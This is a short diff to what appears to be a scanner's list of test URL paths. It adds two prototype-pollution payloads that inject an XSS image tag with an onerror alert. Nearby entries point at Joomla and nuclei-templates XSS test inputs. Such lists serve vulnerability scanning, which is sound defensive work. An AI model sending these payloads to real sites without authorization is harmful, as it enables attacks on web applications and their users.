@@ -200,3 +200,5 @@
 /joomla/greenery_hub/index.php/en/hotels/reservations?location=
 /joomla/greenery_hub/index.php/en/hotels/reservations?location=italy&checkin=27-07-2023&checkout=28-07-2023&option=com_solidres&task=hub.search&Itemid=
 /_image?href=https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/refs/heads/main/helpers/payloads/retool-xss.svg&f=svg
+/?__proto__%5Bcontext%5D=%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E&__proto__%5Bjquery%5D=x
+/?constructor%5Bprototype%5D%5Bcontext%5D=%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E&constructor%5Bprototype%5D%5Bjquery%5D=x
